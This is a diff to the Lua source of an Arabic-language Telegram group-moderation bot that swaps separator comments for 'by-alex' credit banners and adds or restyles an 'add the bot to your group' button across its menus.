 local Num = text:match("^اضف نقاط (%d+)$")
 function reply(extra, result, success)
@@ -16259,7 +16240,7 @@ end
 tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},reply, nil)
 return false
 end
-------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if text and text:match("^اضف رسائل (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
 local Num = text:match("^اضف رسائل (%d+)$")
 function reply(extra, result, success)
@@ -16588,12 +16569,13 @@ keyboard.inline_keyboard = {
 {
 {text = '《♡ 𝗣𝗢𝗪𝗘𝗥》', url="t.me/XV_VM"},
 },
+{{text = 'اضف البوت الي مجموعتك 🌚💞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 return false
 end
-----------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex----
 if text == 'الالعاب' then
 local Text = [[
 [🎮اختر العه الذي تريدها .↑]
@@ -16616,6 +16598,7 @@ keyboard.inline_keyboard = {
 {
 {text = '《♡ 𝗣𝗢𝗪𝗘𝗥》', url="t.me/XV_VM"},
 },
+{{text = 'اضف البوت الي مجموعتك 🌚💞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
@@ -16635,6 +16618,7 @@ keyboard.inline_keyboard = {
 {
 {text = '˹《♡ 𝗣𝗢𝗪𝗘𝗥》˼', url="t.me/XV_VM"},
 },
+{{text = 'اضف البوت الي مجموعتك 🌚💞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
@@ -16933,7 +16917,7 @@ local Text = [[
 keyboard = {} 
 keyboard.inline_keyboard = {
 {{text = 'BOT Telegram', url="t.me/LC6BOT"}}, 
-{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
+{{text = 'اضف البوت الي مجموعتك 🌚💞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/yhu79/7&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
@@ -16947,12 +16931,12 @@ end
 tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},prom_reply, nil)
 end
 end
-------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if text == "صلاحياتي" then 
 if tonumber(msg.reply_to_message_id_) == 0 then 
 Get_Info(msg,msg.chat_id_,msg.sender_user_id_)
 end  
-------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if text and text:match('^صلاحياته @(.*)') then   
 local username = text:match('صلاحياته @(.*)')   
 if tonumber(msg.reply_to_message_id_) == 0 then 
@@ -16966,10 +16950,10 @@ end
 tdcli_function ({ID = "SearchPublicChat",username_ = username},prom_username,nil) 
 end 
 end
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 end -- Chat_Type = 'GroupBot' 
 end -- end msg 
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 function tdcli_update_callback(data)  -- clback
 if data.ID == "UpdateChannel" then 
 if data.channel_.status_.ID == "ChatMemberStatusKicked" then 
@@ -17029,7 +17013,7 @@ keyboard.inline_keyboard = {
 {
 {text = 'الرجوع الاوامر 🃏', callback_data="/help8"},
 },
-{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
+{{text = 'اضف البوت الي مجموعتك 🌚💞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
@@ -17102,7 +17086,7 @@ keyboard.inline_keyboard = {
 {
 {text = 'الرجوع الاوامر 🃏', callback_data="/help8"},
 },
-{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
+{{text = 'اضف البوت الي مجموعتك 🌚💞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
@@ -17166,7 +17150,7 @@ keyboard.inline_keyboard = {
 {
 {text = '◗القائمه الرائسيه◖', callback_data="/help8"},
 },
-{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
+{{text = 'اضف البوت الي مجموعتك 🌚💞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
@@ -17266,7 +17250,7 @@ keyboard.inline_keyboard = {
 {
 {text = 'Back ⌾', callback_data="/help8"},
 },
-{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
+{{text = 'اضف البوت الي مجموعتك 🌚💞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
@@ -17350,7 +17334,7 @@ keyboard.inline_keyboard = {
 {
 {text = 'الرجوع الاوامر 🃏', callback_data="/help8"},
 },
-{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
+{{text = 'اضف البوت الي مجموعتك 🌚💞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
@@ -17391,7 +17375,7 @@ keyboard.inline_keyboard = {
 {
 {text = 'الرجوع الاوامر 🃏', callback_data="/help8"},
 },
-{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
+{{text = 'اضف البوت الي مجموعتك 🌚💞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
@@ -17464,7 +17448,7 @@ keyboard.inline_keyboard = {
 {
 {text = 'مميزات التسليه 🧸', callback_data="/help10"},
 },
-{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
+{{text = 'اضف البوت الي مجموعتك 🌚💞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
@@ -17496,7 +17480,7 @@ keyboard.inline_keyboard = {
 {
 {text = '《♡ 𝗣𝗢𝗪𝗘𝗥》', url="t.me/XV_VM"},
 },
-{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
+{{text = 'اضف البوت الي مجموعتك 🌚💞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
@@ -17587,7 +17571,7 @@ keyboard.inline_keyboard = {
 {
 {text = '𓆩𝑷𝑶𝑾𝑬𝑹𓆪', url="t.me/sopowerb0t"},
 },
-{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
+{{text = 'اضف البوت الي مجموعتك 🌚💞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
@@ -17610,7 +17594,7 @@ keyboard.inline_keyboard = {
 {{text = 'نسبه جمالي', callback_data="/help18"},{text = 'اليتيوب', callback_data="/help24"}},
 {{text = '◗القائمه الرائسيه◖', callback_data="/help7"}},
 {{text = '《♡ 𝗣𝗢𝗪𝗘𝗥》', url="t.me/XV_VM"}},
-{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
+{{text = 'اضف البوت الي مجموعتك 🌚💞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
@@ -17644,7 +17628,7 @@ keyboard.inline_keyboard = {
 {
 {text = '《♡ 𝗣𝗢𝗪𝗘𝗥》', url="t.me/XV_VM"},
 },
-{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
+{{text = 'اضف البوت الي مجموعتك 🌚💞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
@@ -17666,7 +17650,7 @@ keyboard.inline_keyboard = {
 {{text = 'مريم', callback_data="/help36"},{text = 'عقاب', callback_data="/help42"}},
 {{text = '◗القائمه الرائسيه◖', callback_data="/add"}},
 {{text = '《♡ 𝗣𝗢𝗪𝗘𝗥》', url="t.me/XV_VM"}},
-{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
+{{text = 'اضف البوت الي مجموعتك 🌚💞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
@@ -17776,7 +17760,7 @@ keyboard.inline_keyboard = {
 {{text = 'SmartUpShark', url="https://t.me/gamee?game=SmartUpShark"},{text = 'SpikyFish3', url="https://t.me/gamee?game=SpikyFish3"}},  
 {{text = '◗القائمه الرائسيه◖', callback_data="/add"}},
 {{text = '《♡ 𝗣𝗢𝗪𝗘𝗥》', url="t.me/XV_VM"}},
-{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
+{{text = 'اضف البوت الي مجموعتك 🌚💞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
@@ -17833,7 +17817,7 @@ keyboard.inline_keyboard = {
 {
 {text = '《♡ 𝗣𝗢𝗪𝗘𝗥》', url="t.me/XV_VM"},
 },
-{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
+{{text = 'اضف البوت الي مجموعتك 🌚💞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
@@ -17854,7 +17838,7 @@ keyboard.inline_keyboard = {
 {{text = 'نسبه جمالي', callback_data="/help18"},{text = 'اليتيوب', callback_data="/help24"}},
 {{text = '◗القائمه الرائسيه◖', callback_data="/add"}},
 {{text = '《♡ 𝗣𝗢𝗪𝗘𝗥》', url="t.me/XV_VM"}},
-{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
+{{text = 'اضف البوت الي مجموعتك 🌚💞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
@@ -17955,7 +17939,7 @@ keyboard.inline_keyboard = {
 {
 {text = '《♡ 𝗣𝗢𝗪𝗘𝗥》', url="t.me/XV_VM"},
 },
-{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
+{{text = 'اضف البوت الي مجموعتك 🌚💞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
 end
@@ -17963,11 +17947,11 @@ end
 if data.ID == "UpdateNewMessage" then  -- new msg
 msg = data.message_
 text = msg.content_.text_
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if text and not database:sismember(bot_id..'Spam:Texting'..msg.sender_user_id_,text) then
 database:del(bot_id..'Spam:Texting'..msg.sender_user_id_) 
 end
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if text and database:get(bot_id.."Del:Cmd:Group"..msg.chat_id_..':'..msg.sender_user_id_) == 'true' then
 local NewCmmd = database:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..':'..text)
 if NewCmmd then
@@ -17981,7 +17965,7 @@ end
 database:del(bot_id.."Del:Cmd:Group"..msg.chat_id_..':'..msg.sender_user_id_)
 return false
 end 
--------------------------------------------------------------------------------------------------------------- 
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex 
 if data.message_.content_.text_ then
 local NewCmmd = database:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..':'..data.message_.content_.text_)
 if NewCmmd then
@@ -18172,40 +18156,40 @@ xl = 'نسبه الانوثه '..text..' هي : \n '..sendnuj..'%'
 send(msg.chat_id_, msg.id_,xl) 
 database:del(bot_id..":"..msg.sender_user_id_..":ano_Bots"..msg.chat_id_)
 end
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if msg.sender_user_id_ and Muted_User(msg.chat_id_,msg.sender_user_id_) then 
 DeleteMessage(msg.chat_id_, {[0] = msg.id_})  
 return false  
 end
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if msg.sender_user_id_ and Ban_User(msg.chat_id_,msg.sender_user_id_) then 
 chat_kick(msg.chat_id_,msg.sender_user_id_) 
 DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
 return false  
 end
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and Ban_User(msg.chat_id_,msg.content_.members_[0].id_) then 
 chat_kick(msg.chat_id_,msg.content_.members_[0].id_) 
 DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
 return false
 end
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if msg.sender_user_id_ and GBan_User(msg.sender_user_id_) then 
 chat_kick(msg.chat_id_,msg.sender_user_id_) 
 DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
 return false 
 end
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if msg.sender_user_id_ and Gmute_User(msg.sender_user_id_) then 
 DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
 return false 
 end
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and GBan_User(msg.content_.members_[0].id_) then 
 chat_kick(msg.chat_id_,msg.content_.members_[0].id_) 
 DeleteMessage(msg.chat_id_, {[0] = msg.id_})  
 end 
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if msg.content_.ID == "MessageChatAddMembers" then  
 database:set(bot_id.."Who:Added:Me"..msg.chat_id_..':'..msg.content_.members_[0].id_,msg.sender_user_id_)
 local mem_id = msg.content_.members_  
@@ -18229,7 +18213,7 @@ end
 end     
 end
 end
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if msg.content_.ID == "MessageChatAddMembers" then  
 local mem_id = msg.content_.members_  
 local Bots = database:get(bot_id.."lock:Bot:kick"..msg.chat_id_) 
@@ -18261,23 +18245,23 @@ PinMessage(msg.chat_id_,Msg_Pin)
 end
 end
 end
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if msg.content_.ID == "MessageChatDeletePhoto" or msg.content_.ID == "MessageChatChangePhoto" or msg.content_.ID == 'MessagePinMessage' or msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" or msg.content_.ID == 'MessageChatChangeTitle' or msg.content_.ID == "MessageChatDeleteMember" then   
 if database:get(bot_id..'lock:tagservr'..msg.chat_id_) then  
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
 return false
 end    
 end   
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 SourceDRAGON(data.message_,data)
 plugin_Dragon(data.message_)
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 if data.username_ then
 database:set(bot_id..'user:Name'..msg.sender_user_id_,(data.username_))
 end
---------------------------------------------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if tonumber(data.id_) == tonumber(bot_id) then
 return false
 end
@@ -18313,65 +18297,65 @@ DeleteMessage(msg.chat_id_,{[0] = msg.message_id_})
 end
 local text = result.content_.text_
 if not Mod(result) then
-------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 
-------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
 if database:get(bot_id.."lock:Link"..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
 return false
 end 
 end
-------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
 if database:get(bot_id.."lock:Link"..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
 return false
 end  
 end
-------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
 if database:get(bot_id.."lock:Link"..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
 return false
 end  
 end 
-------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if text and text:match("[hH][tT][tT][pP][sT]") or text and text:match("[tT][eE][lL][eE][gG][rR][aA].[Pp][Hh]") or text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa].[Pp][Hh]") then
 if database:get(bot_id.."lock:Link"..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
 return false
 end  
 end 
-------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if text and text:match("(.*)(@)(.*)") then
 if database:get(bot_id.."lock:user:name"..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
 return false
 end  
 end
-------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if text and text:match("@") then
 if database:get(bot_id.."lock:user:name"..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
 return false
 end  
 end 
-------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if text and text:match("(.*)(#)(.*)") then
 if database:get(bot_id.."lock:hashtak"..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
 return false
 end  
 end 
-------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if text and text:match("#") then
 if database:get(bot_id.."lock:user:name"..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
 return false
 end  
 end 
-------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 local DRAGONAbot = database:get(bot_id.."DRAGON1:Add:Filter:Rp2"..text..result.chat_id_)   
 if DRAGONAbot then    
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
@@ -18384,7 +18368,7 @@ end,nil)
 DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
 return false
 end
-------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if text and text:match("/") then
 if database:get(bot_id.."lock:Cmd"..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
@@ -18397,7 +18381,7 @@ DeleteMessage(msg.chat_id_,{[0] = data.message_id_})
 return false
 end 
 end
-------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 if text then
 local DRAGON1_Msg = database:get(bot_id.."DRAGON1:Add:Filter:Rp2"..text..result.chat_id_)   
 if DRAGON1_Msg then    
@@ -18408,7 +18392,7 @@ end
 end
 end
 end,nil)
-------------------------------------------------------------------------
+------by-alex---- by--- alex ------byalex-------power-----soucer----alex
 
 elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then 
 local list = database:smembers(bot_id.."User_Bot") 
